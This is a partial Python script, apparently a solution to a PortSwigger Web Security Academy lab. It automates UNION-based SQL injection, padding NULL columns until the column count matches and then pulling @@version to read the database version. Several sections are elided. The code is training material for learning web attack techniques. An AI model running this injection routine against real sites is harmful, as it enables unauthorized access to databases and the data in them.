...
def main():
    host = 'https://0a1b00390346099780070835007b00ff.web-security-academy.net'
    ...
    nulls = ["null"]
    #from_string = " FROM information_schema.tables"
    comment = quote('#')

    while True:
        payload_to_check = payload_base + ",".join(nulls) + comment
    ...
    #This below works fine, but portswigger wants us to make the specific request of '+UNION+SELECT+@@version,+NULL#
    crafted_payload = payload_base + ",".join(nulls) + from_string + comment    
    print("pre-Final Payload: " + crafted_payload)
    page_visible_text = fetch_string_literal(client.get(crafted_payload).text)
    # Intended by Portswigger
    nulls[0]="@@version"
    crafted_payload = payload_base + ",".join(nulls) + comment
